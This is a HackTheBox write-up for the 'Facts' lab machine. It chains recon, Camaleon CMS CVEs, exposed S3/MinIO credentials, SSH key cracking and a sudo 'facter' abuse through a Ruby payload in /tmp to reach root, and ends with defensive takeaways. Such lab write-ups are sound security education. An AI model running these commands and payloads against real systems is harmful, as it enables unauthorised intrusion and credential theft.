---
layout: default
title: "HTB – Facts | Costabo1"
description: "HackTheBox writeup for the Facts machine by Costabo1"
---

<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;700;800&display=swap');

:root {
  --bg:      #0d0f14;
  --surface: #13161e;
  --border:  #1e2230;
  --accent:  #00ff9d;
  --accent2: #00b8ff;
  --muted:   #6b7280;
  --text:    #d1d5db;
  --heading: #f9fafb;
  --mono:    'Share Tech Mono', monospace;
  --sans:    'Syne', sans-serif;
}
*, *::before, *::after { box-sizing: border-box; }
body {
  background: var(--bg);
  color: var(--text);
  font-family: var(--sans);
  font-size: 23px;
  line-height: 1.9;
  margin: 0;
}

/* ── Hero ───────────────────────────────────── */
.htb-hero {
  border-bottom: 1px solid var(--border);
  padding: 3.5rem 1.5rem 2.5rem;
  background: linear-gradient(135deg, #0d0f14 60%, #0a1a12 100%);
  position: relative;
  overflow: hidden;
}
.htb-hero::before {
  content: "";
  position: absolute;
  inset: 0;
  background: repeating-linear-gradient(0deg, transparent, transparent 39px, rgba(0,255,157,.04) 40px);
  pointer-events: none;
}
.htb-hero .inner { position: relative; z-index: 1; }
.badge-row { display: flex; flex-wrap: wrap; gap: .4rem; margin-bottom: 1.1rem; }
.badge {
  font-family: var(--mono);
  font-size: .72rem;
  padding: .22rem .65rem;
  border-radius: 3px;
  border: 1px solid;
  letter-spacing: .06em;
  text-transform: uppercase;
}
.badge-easy    { color: var(--accent);  border-color: var(--accent);  background: rgba(0,255,157,.07); }
.badge-linux   { color: var(--accent2); border-color: var(--accent2); background: rgba(0,184,255,.07); }
.badge-retired { color: var(--muted);   border-color: var(--muted);   background: rgba(107,114,128,.07); }
.htb-hero h1 {
  font-family: var(--sans);
  font-weight: 800;
  font-size: clamp(1.8rem, 6vw, 3rem);
  color: var(--heading);
  margin: 0 0 .5rem;
  letter-spacing: -.02em;
  line-height: 1.15;
}
.htb-hero h1 span { color: var(--accent); }
.htb-hero .subtitle { font-family: var(--mono); color: var(--muted); font-size: .82rem; margin: 0; }

/* ── Layout ─────────────────────────────────── */
.content-wrap { max-width: 860px; margin: 0 auto; padding: 0 1.5rem 5rem; }

/* ── Info grid ───────────────────────────────── */
.info-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
  gap: 1px;
  background: var(--border);
  border: 1px solid var(--border);
  border-radius: 6px;
  overflow: hidden;
  margin: 2.5rem 0;
  font-family: var(--mono);
  font-size: .82rem;
}
.info-grid .cell { background: var(--surface); padding: .9rem 1rem; }
.info-grid .cell .lbl { color: var(--muted); font-size: .65rem; text-transform: uppercase; letter-spacing: .1em; margin-bottom: .25rem; }
.info-grid .cell .val { color: var(--heading); }

/* ── Section headings ────────────────────────── */
.section-heading {
  font-family: var(--sans);
  font-weight: 700;
  font-size: 1.25rem;
  color: var(--heading);
  margin: 3.75rem 0 1.4rem;
  padding-bottom: .55rem;
  border-bottom: 1px solid var(--border);
}
.sub-heading {
  font-family: var(--mono);
  font-weight: 700;
  color: var(--accent);
  font-size: .9rem;
  margin: 2.5rem 0 .85rem;
  letter-spacing: .05em;
  text-transform: uppercase;
}

/* ── Prose ───────────────────────────────────── */
.prose p {
  margin: 0 0 1.25rem;
  line-height: 1.9;
  color: var(--text);
}
.prose strong { color: var(--heading); }
.prose a { color: var(--accent2); text-decoration: none; }
.prose a:hover { text-decoration: underline; }
.prose code {
  background: rgba(0,255,157,.07);
  color: var(--accent);
  padding: .1em .45em;
  border-radius: 3px;
  font-family: var(--mono);
  font-size: .85em;
  word-break: break-word;
}
.prose ul {
  padding-left: 1.4rem;
  margin: .25rem 0 1.75rem;
}
.prose ul li {
  margin-bottom: .65rem;
  line-height: 1.8;
}
.prose ul li strong { color: var(--heading); }

/* ── Code blocks ─────────────────────────────── */
.codeblock {
  background: #080a0f;
  border: 1px solid var(--border);
  border-left: 3px solid var(--accent);
  border-radius: 4px;
  padding: 1.1rem 1.25rem;
  overflow-x: auto;
  font-family: var(--mono);
  font-size: .82rem;
  color: #a8ffcb;
  margin: .5rem 0 2rem;
  -webkit-overflow-scrolling: touch;
  line-height: 1.65;
  white-space: pre;
}
.codeblock.output {
  border-left-color: var(--border);
  color: var(--text);
}

/* ── Callouts ────────────────────────────────── */
.callout {
  border: 1px solid;
  border-radius: 5px;
  padding: 1.1rem 1.15rem;
  margin: 1.75rem 0 2.25rem;
  font-size: .93rem;
  display: flex;
  gap: .8rem;
  align-items: flex-start;
  line-height: 1.75;
}
.ci { flex-shrink: 0; font-size: 1.05rem; line-height: 1.75; }
.cb { flex: 1; }
.cb strong { display: block; margin-bottom: .3rem; font-size: .72rem; text-transform: uppercase; letter-spacing: .09em; }
.callout.info   { border-color: rgba(0,184,255,.3);  background: rgba(0,184,255,.05);  color: #93c5fd; }
.callout.danger { border-color: rgba(255,75,75,.3);  background: rgba(255,75,75,.05);  color: #fca5a5; }
.callout.win    { border-color: rgba(0,255,157,.3);  background: rgba(0,255,157,.05);  color: var(--accent); }

/* ── Tool pills ──────────────────────────────── */
.tool-list { display: flex; flex-wrap: wrap; gap: .45rem; margin: .75rem 0 2.25rem; padding: 0; list-style: none; }
.tool-list li {
  font-family: var(--mono);
  font-size: .75rem;
  padding: .28rem .7rem;
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 3px;
  color: var(--accent2);
  letter-spacing: .04em;
}

/* ── Diff bar ────────────────────────────────── */
.diff-bar { margin: .25rem 0 2.25rem; }
.diff-bar .track { height: 4px; background: var(--border); border-radius: 99px; width: min(200px, 55%); }
.diff-bar .fill { height: 100%; border-radius: 99px; background: linear-gradient(90deg, var(--accent), var(--accent2)); }
.diff-bar .lbl { font-family: var(--mono); font-size: .7rem; color: var(--muted); margin-top: .35rem; }

/* ── Attack chain ────────────────────────────── */
.chain { margin: 1.5rem 0 2.5rem; }
.chain-item { margin-bottom: 4px; }
.chain-node { background: var(--surface); border: 1px solid var(--border); border-radius: 5px; padding: .75rem 1.1rem; color: var(--text); font-size: .92rem; line-height: 1.6; }
.chain-node .tag { font-family: var(--mono); font-size: .65rem; color: var(--accent); text-transform: uppercase; letter-spacing: .1em; margin-bottom: .25rem; }
.chain-node code { background: rgba(0,255,157,.07); color: var(--accent); padding: .1em .4em; border-radius: 3px; font-family: var(--mono); font-size: .85em; }
.chain-connector { width: 1px; height: 18px; background: rgba(0,255,157,.2); margin-left: 5px; }

/* ── Cred table ──────────────────────────────── */
.cred-table { width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: .82rem; margin: .75rem 0 2.25rem; display: block; overflow-x: auto; -webkit-overflow-scrolling: touch; }
.cred-table th { background: var(--surface); color: var(--muted); font-size: .65rem; text-transform: uppercase; letter-spacing: .1em; padding: .6rem 1rem; text-align: left; border: 1px solid var(--border); white-space: nowrap; }
.cred-table td { border: 1px solid var(--border); padding: .6rem 1rem; color: var(--text); word-break: break-all; }
.cred-table tr:hover td { background: rgba(255,255,255,.02); }

/* ── Flag block ──────────────────────────────── */
.flag-block { display: flex; align-items: center; flex-wrap: wrap; gap: .85rem; background: rgba(0,255,157,.04); border: 1px solid rgba(0,255,157,.2); border-radius: 6px; padding: 1.1rem 1.25rem; margin: 1.25rem 0 2.5rem; font-family: var(--mono); }
.flag-block .fi { font-size: 1.35rem; flex-shrink: 0; }
.flag-block .fl { font-size: .65rem; color: var(--muted); text-transform: uppercase; letter-spacing: .1em; white-space: nowrap; }
.flag-block .fv { color: var(--accent); font-size: .85rem; word-break: break-all; flex: 1; min-width: 0; }

/* ── Divider ─────────────────────────────────── */
.divider { border: none; border-top: 1px solid var(--border); margin: 3.25rem 0; }

/* ── Footer ──────────────────────────────────── */
.writeup-footer { border-top: 1px solid var(--border); padding: 1.5rem; font-family: var(--mono); font-size: .75rem; color: var(--muted); text-align: center; margin-top: 2rem; }
.writeup-footer span { color: var(--accent); }

/* ── Mobile ──────────────────────────────────── */
@media (max-width: 600px) {
  body { font-size: 16px; line-height: 1.8; }
  .htb-hero { padding: 2.25rem 1.1rem 1.75rem; }
  .content-wrap { padding: 0 1.1rem 3.5rem; }
  .info-grid { grid-template-columns: repeat(2, 1fr); font-size: .78rem; }
  .section-heading { font-size: 1.1rem; margin-top: 3rem; }
  .sub-heading { font-size: .85rem; margin-top: 2rem; }
  .codeblock { font-size: .76rem; padding: .9rem; margin-bottom: 1.5rem; }
  .cred-table { font-size: .75rem; }
  .callout { font-size: .88rem; padding: .9rem; margin-bottom: 1.75rem; }
  .chain-node { font-size: .86rem; }
  .prose p { margin-bottom: 1rem; }
}

  /* ── Image zoom lightbox ─────────────────────── */
.zoomable { cursor: zoom-in; transition: opacity .2s; }
.zoomable:hover { opacity: .85; }
.lightbox { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.85); z-index: 9999; align-items: center; justify-content: center; padding: 1.5rem; }
.lightbox.active { display: flex; }
.lightbox img { max-width: 150%; max-height: 135vh; border-radius: 8px; box-shadow: 0 0 60px rgba(0,255,157,.15); }
.lightbox-close { position: absolute; top: 1.25rem; right: 1.5rem; color: var(--muted); font-family: var(--mono); font-size: .85rem; text-decoration: none; letter-spacing: .05em; cursor: pointer; }
.lightbox-close:hover { color: var(--accent); }

</style>

<!-- HERO -->
<div class="htb-hero">
  <div class="content-wrap inner">
    <div class="badge-row">
      <span class="badge badge-easy">Easy</span>
      <span class="badge badge-linux">Linux</span>
      <span class="badge badge-retired">Retired</span>
    </div>
    <h1>👾 HackTheBox — <span>Facts</span></h1>
    <p class="subtitle">costabo1 &nbsp;·&nbsp; writeup &nbsp;·&nbsp; 2025</p>
  </div>

   <div style="margin-top: 1.5rem;">
      <img src="/assets/htb/facts/htbfacts.png"
           alt="HackTheBox Facts machine card"
           style="max-width: 100%; width: 420px; border-radius: 8px; border: 1px solid var(--border);">
    </div>

<!-- Zoom script — place once near bottom of content-wrap -->
<script>
document.addEventListener('DOMContentLoaded', function () {
  document.querySelectorAll('.zoomable').forEach(function (img) {
    img.addEventListener('click', function () {
      var box = document.getElementById(this.getAttribute('data-target'));
      box.style.display = 'flex';
    });
  });
  document.querySelectorAll('.lightbox-close').forEach(function (btn) {
    btn.addEventListener('click', function () {
      this.closest('div').style.display = 'none';
    });
  });
  document.querySelectorAll('[id^="zoom-"]').forEach(function (box) {
    box.addEventListener('click', function (e) {
      if (e.target === this) this.style.display = 'none';
    });
  });
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape') {
      document.querySelectorAll('[id^="zoom-"]').forEach(function (box) {
        box.style.display = 'none';
      });
    }
  });
});
</script>

<div class="content-wrap">

  <!-- Info grid -->
  <div class="info-grid">
    <div class="cell"><div class="lbl">OS</div><div class="val">Linux</div></div>
    <div class="cell"><div class="lbl">Difficulty</div><div class="val">Easy</div></div>
    <div class="cell"><div class="lbl">Points</div><div class="val">20</div></div>
    <div class="cell"><div class="lbl">CVEs</div><div class="val">2025-2304 · 2024-46987</div></div>
    <div class="cell"><div class="lbl">Status</div><div class="val">N/A</div></div>
    <div class="cell"><div class="lbl">Author</div><div class="val">Costabo1</div></div>
  </div>

  <hr class="divider">

  <!-- ═══ OVERVIEW ═══ -->
  <h2 class="section-heading">🔭 Overview</h2>
  <div class="prose">
    <p>Facts is an easy-difficulty Linux machine built around a realistic multi-stage attack chain.</p>
    <p>You'll start by registering an account on a publicly exposed CMS registration page, then exploit a privilege escalation vulnerability to gain admin access. From inside the admin panel, leaked AWS credentials lead you to a misconfigured S3 bucket containing a private SSH key. After cracking the key's passphrase you land a shell — then escalate to root by abusing a dangerous <code>sudo</code> rule tied to the <code>facter</code> binary.</p>
    <p><strong>Attack chain at a glance:</strong></p>
  </div>

  <div class="chain">
    <div class="chain-item">
      <div class="chain-node"><div class="tag">Step 1 — Web Recon</div>Open <code>/admin/register</code> endpoint → create account on Camaleon CMS 2.9.0</div>
      <div class="chain-connector"></div>
    </div>
    <div class="chain-item">
      <div class="chain-node"><div class="tag">Step 2 — CVE-2025-2304</div>CMS privilege escalation → elevate account to admin</div>
      <div class="chain-connector"></div>
    </div>
    <div class="chain-item">
      <div class="chain-node"><div class="tag">Step 3 — Cloud Credentials</div>AWS keys exposed in admin panel → enumerate S3 buckets</div>
      <div class="chain-connector"></div>
    </div>
    <div class="chain-item">
      <div class="chain-node"><div class="tag">Step 4 — CVE-2024-46987</div>Arbitrary file read → extract SSH private key from internal bucket</div>
      <div class="chain-connector"></div>
    </div>
    <div class="chain-item">
      <div class="chain-node"><div class="tag">Step 5 — Privilege Escalation</div>Crack SSH key → SSH in as <code>trivia</code> → abuse <code>sudo facter</code> → root shell</div>
    </div>
  </div>

  <div class="diff-bar">
    <div class="track"><div class="fill" style="width:30%"></div></div>
    <div class="lbl">Difficulty feel: Easy</div>
  </div>

  <!-- ═══ TOOLS ═══ -->
  <h2 class="section-heading">🛠️ Tools Used</h2>
  <ul class="tool-list">
    <li>nmap</li><li>gobuster</li><li>curl</li><li>burpsuite</li>
    <li>aws-cli</li><li>john</li><li>ssh</li><li>GTFOBins</li>
  </ul>

  <hr class="divider">

  <!-- ═══ ENUMERATION ═══ -->
  <h2 class="section-heading">🔍 Enumeration</h2>

  <h3 class="sub-heading">Port Scan</h3>
  <div class="prose">
    <p>Start with a full service and version scan to map the attack surface:</p>
  </div>
  <div class="codeblock">nmap -sC -sV -oN facts.nmap 10.129.35.249</div>
  <div class="codeblock output">PORT   STATE  SERVICE  VERSION
22/tcp open   ssh      OpenSSH 9.9p1 Ubuntu 3ubuntu3.2
80/tcp open   http     nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/</div>
  <div class="prose">
    <p>Only two ports are open — SSH and a web server. The HTTP service immediately redirects to <code>facts.htb</code>, so before doing anything else, add the hostname to your hosts file:</p>
  </div>
  <div class="codeblock">echo "10.129.35.249  facts.htb" | sudo tee -a /etc/hosts</div>

  <h3 class="sub-heading">Web Enumeration</h3>
  <div class="prose">
    <p>With the hostname resolving correctly, run a directory brute-force to find any hidden or unlisted endpoints:</p>
  </div>
  <div class="codeblock">gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/common.txt</div>
  <div class="codeblock output">/admin/login      (Status: 200)
/admin/register   (Status: 200)</div>

  <div class="callout info">
    <span class="ci">ℹ️</span>
    <div class="cb">
      <strong>Key Finding</strong>
      The <code>/admin/register</code> endpoint is publicly accessible — no invite code, no admin approval, no CAPTCHA. Anyone can create an account. This is the primary entry point.
    </div>
  </div>

  <div class="prose">
    <p>Navigating to <code>/admin/register</code> and filling out the form works without restriction. A test account was created:</p>
    <ul>
      <li><strong>Username:</strong> <code>mew1222</code></li>
      <li><strong>Password:</strong> <code>mew121212</code></li>
    </ul>
    <p>After logging in, the application footer and source code reveal it's running <strong>Camaleon CMS 2.9.0</strong> — a Ruby on Rails CMS with a known authenticated privilege escalation vulnerability we'll use next.</p>
  </div>

  <hr class="divider">

<h2 class="section-heading">⚡ Initial Foothold</h2>

<h3 class="sub-heading">Step 1 — CMS Privilege Escalation (CVE-2025-2304)</h3>
<div class="prose">
  <p><strong>CVE-2025-2304</strong> affects Camaleon CMS 2.9.0 and allows any authenticated user to escalate their permissions to admin level by manipulating certain CMS role parameters.</p>
</div>

<!-- Burp screenshot -->
<img class="zoomable"
     src="/assets/htb/facts/factBurpc.png"
     alt="Burp screenshot"
     data-target="zoom-burp"
     style="max-width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0 2rem;cursor:zoom-in;">
<div id="zoom-burp" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:9999;align-items:center;justify-content:center;padding:1.5rem;">
  <span style="position:absolute;top:1.25rem;right:1.5rem;color:#6b7280;font-family:monospace;font-size:.85rem;cursor:pointer;" class="lightbox-close">✕ close</span>
  <img src="/assets/htb/facts/factBurpc.png" style="max-width:150%;max-height:135vh;border-radius:8px;">

</div>

<img class="zoomable"
     src="/assets/htb/facts/adminpannel.png"
     alt="Admin panel screenshot"
     data-target="zoom-admin"
     style="max-width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0 2rem;cursor:zoom-in;">
<div id="zoom-admin" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:9999;align-items:center;justify-content:center;padding:1.5rem;">
  <span style="position:absolute;top:1.25rem;right:1.5rem;color:#6b7280;font-family:monospace;font-size:.85rem;cursor:pointer;" class="lightbox-close">✕ close</span>
  <img src="/assets/htb/facts/adminpannel.png" style="max-width:150%;max-height:135vh;border-radius:8px;">
</div>
  
<h3 class="sub-heading">Step 2 — AWS Credentials Exposed in the Admin Panel</h3>
<div class="prose">
  <p>Inside the admin panel under storage settings, AWS S3 credentials were already populated with live values:</p>
</div>

<table class="cred-table">
  <tr><th>Field</th><th>Value</th></tr>
  <tr><td>Access Key</td><td>AKIAD337D13639BD95BE</td></tr>
  <tr><td>Secret Key</td><td>v9WTmIuNeeq4L5s72WobV6CQs6HIJVkrq7NdRpZb</td></tr>
  <tr><td>Region</td><td>us-east-1</td></tr>
  <tr><td>Endpoint</td><td>http://facts.htb:54321</td></tr>
</table>

<div class="prose">
  <p>The endpoint points to a local <strong>MinIO</strong> instance — a self-hosted S3-compatible object storage server running on port 54321. With these keys we can interact with it exactly like a real AWS account.</p>
</div>
  <h3 class="sub-heading">Step 3 — S3 Bucket Enumeration</h3>
  <div class="prose">
    <p>Configure the AWS CLI with the recovered credentials and list all available buckets:</p>
  </div>
  <div class="codeblock">aws --endpoint-url http://facts.htb:54321 s3 ls</div>
  <div class="codeblock output">internal
randomfacts</div>
  <div class="prose">
    <p>The <code>internal</code> bucket stands out. Listing its contents reveals a <code>.ssh/</code> directory. Download the private key:</p>
  </div>
  <div class="codeblock">aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/</div>
  <div class="codeblock">aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .</div>
  <div class="prose">
    <p>We now have a private SSH key — but it's passphrase-protected and we don't yet know which user it belongs to. That's where the next CVE comes in.</p>
  </div>

  <h3 class="sub-heading">Step 4 — User Discovery via Arbitrary File Read (CVE-2024-46987)</h3>
  <div class="prose">
    <p><strong>CVE-2024-46987</strong> is an authenticated arbitrary file read vulnerability in Camaleon CMS. Using our admin account, the exploit can pull any readable file from the server — starting with <code>/etc/passwd</code> to identify local users:</p>
  </div>
  <div class="codeblock">python3 adminpan.py -u http://facts.htb -l mew1222 -p mew121212 /etc/passwd</div>
  <div class="codeblock output">trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash</div>
  <div class="prose">
    <p>Two shell users: <code>trivia</code> and <code>william</code>. The SSH key we pulled from the bucket belongs to one of them — we'll find out which when we crack it.</p>
  </div>

  <h3 class="sub-heading">Step 5 — Crack the SSH Key &amp; Get a Shell</h3>
  <div class="prose">
    <p>The <code>id_ed25519</code> key is passphrase-protected. Convert it to a crackable format and run it through John the Ripper:</p>
  </div>
  <div class="codeblock">ssh2john id_ed25519 > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</div>
  <div class="prose">
    <p>The passphrase cracks quickly: <code>d*****z</code> <em>(redacted — find it yourself 🙂)</em></p>
    <p>The key belongs to user <code>trivia</code>. Log in:</p>
  </div>
  <div class="codeblock">ssh -i id_ed25519 trivia@facts.htb</div>
  <div class="codeblock output">trivia@facts:~$ pwd
/home/trivia</div>
  <div class="prose">
    <p>We have a shell on the box.</p>
  </div>

  <h3 class="sub-heading">🏴 User Flag</h3>
  <div class="prose">
    <p>The user flag lives in <code>william</code>'s home directory, readable by <code>trivia</code>:</p>
  </div>
  <div class="codeblock">cat /home/william/user.txt</div>
  <div class="flag-block">
    <span class="fi">🏴</span>
    <span class="fl">user.txt</span>
    <span class="fv">f36*************&nbsp; (redacted)</span>
  </div>

  <hr class="divider">

  <!-- ═══ PRIVESC ═══ -->
  <h2 class="section-heading">📈 Privilege Escalation</h2>

  <h3 class="sub-heading">Enumeration</h3>
  <div class="prose">
    <p>The first thing to check after landing a shell is what the current user can run with elevated privileges:</p>
  </div>
  <div class="codeblock">sudo -l</div>
  <div class="codeblock output">User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter --custom-dir /tmp</div>

  <div class="callout danger">
    <span class="ci">🔴</span>
    <div class="cb">
      <strong>Dangerous Sudo Rule</strong>
      <code>facter</code> loads and executes Ruby <code>.rb</code> scripts from whatever directory is passed via <code>--custom-dir</code>. Since <code>/tmp</code> is world-writable by any user on the system, and this command runs as root through sudo, it gives us a direct path to arbitrary code execution as root.
    </div>
  </div>

  <h3 class="sub-heading">Exploitation</h3>
  <div class="prose">
    <p>The exploit is simple. Write a malicious Ruby one-liner to <code>/tmp</code>, then trigger it via the allowed sudo command.</p>
    <p>Drop the payload into <code>/tmp</code>:</p>
  </div>
  <div class="codeblock">echo 'exec("/bin/sh")' > /tmp/x.rb</div>
  <div class="prose">
    <p>Execute it with root privileges via the sudo rule:</p>
  </div>
  <div class="codeblock">sudo /usr/bin/facter --custom-dir /tmp</div>
  <div class="codeblock output"># whoami
root
# cd /root && ls
minio-binaries  ministack  root.txt  snap</div>

  <div class="callout win">
    <span class="ci">✅</span>
    <div class="cb">
      <strong>Root Obtained</strong>
      <code>facter</code> loaded and executed the Ruby script from <code>/tmp</code>, spawning a root shell directly. Full system compromise achieved.
    </div>
  </div>
<img class="zoomable"
     src="/assets/htb/facts/factrootblurr.png"
     alt="Root shell screenshot"
     data-target="zoom-factroot"
     style="max-width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0 2rem;cursor:zoom-in;">
<div id="zoom-factroot" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.88);z-index:9999;align-items:center;justify-content:center;padding:1.5rem;">
  <span class="lightbox-close" style="position:absolute;top:1.25rem;right:1.5rem;color:#6b7280;font-family:monospace;font-size:.85rem;cursor:pointer;">✕ close</span>
  <img src="/assets/htb/facts/factrootblurr.png"
       alt="Root shell screenshot"
       style="max-width:125%;max-height:112.5vh;border-radius:8px;">
</div>
  <h3 class="sub-heading">🏁 Root Flag</h3>
  <div class="codeblock">cat /root/root.txt</div>
  <div class="flag-block">
    <span class="fi">🏁</span>
    <span class="fl">root.txt</span>
    <span class="fv">eda2a**********&nbsp; (redacted)</span>
  </div>

  <hr class="divider">

  <!-- ═══ TAKEAWAYS ═══ -->
  <h2 class="section-heading">📝 Key Takeaways</h2>
  <div class="prose">
    <ul>
      <li><strong>Open registration on admin panels is a critical misconfiguration.</strong> If self-registration must exist, it should require email verification and manual admin approval — never auto-grant access to sensitive interfaces.</li>
      <li><strong>Cloud credentials do not belong in CMS config panels.</strong> Any user who gains access to that panel inherits those credentials. Use IAM roles, environment variables, or a dedicated secrets manager instead.</li>
      <li><strong>S3 misconfigurations are everywhere.</strong> Whenever you recover AWS credentials during an engagement, always enumerate available buckets — even "internal" ones frequently contain SSH keys, database dumps, or source code.</li>
      <li><strong>Arbitrary file read is rarely just informational.</strong> Here it exposed SSH private keys and local user accounts. Always trace what sensitive files might be reachable when you find this class of vulnerability.</li>
      <li><strong>Sudo rules with user-writable directories are root-equivalent.</strong> Any <code>--custom-dir</code>, <code>--plugin-dir</code>, or script-loading flag that points to <code>/tmp</code> or another writable path should be treated as an immediate privilege escalation path.</li>
      <li><strong>The chain is everything.</strong> None of these issues alone would have been critical. It was the combination of open registration → CMS privesc → credential exposure → S3 abuse → SSH key → sudo misconfiguration that resulted in full compromise.</li>
    </ul>
  </div>

  <hr class="divider">

  <!-- ═══ REFERENCES ═══ -->
  <h2 class="section-heading">🔗 References</h2>
  <div class="prose">
    <ul>
      <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2304">NVD — CVE-2025-2304</a></li>
      <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-46987">NVD — CVE-2024-46987</a></li>
      <li><a href="https://github.com/owen2345/camaleon-cms">Camaleon CMS on GitHub</a></li>
      <li><a href="https://gtfobins.github.io/gtfobins/facter/">GTFOBins — facter</a></li>
      <li><a href="https://docs.aws.amazon.com/cli/latest/reference/s3/">AWS CLI S3 Reference</a></li>
    </ul>
  </div>

</div>

<div class="writeup-footer">
  <span>costabo1</span> &nbsp;·&nbsp; HackTheBox Writeup &nbsp;·&nbsp; All content for educational purposes only
</div>
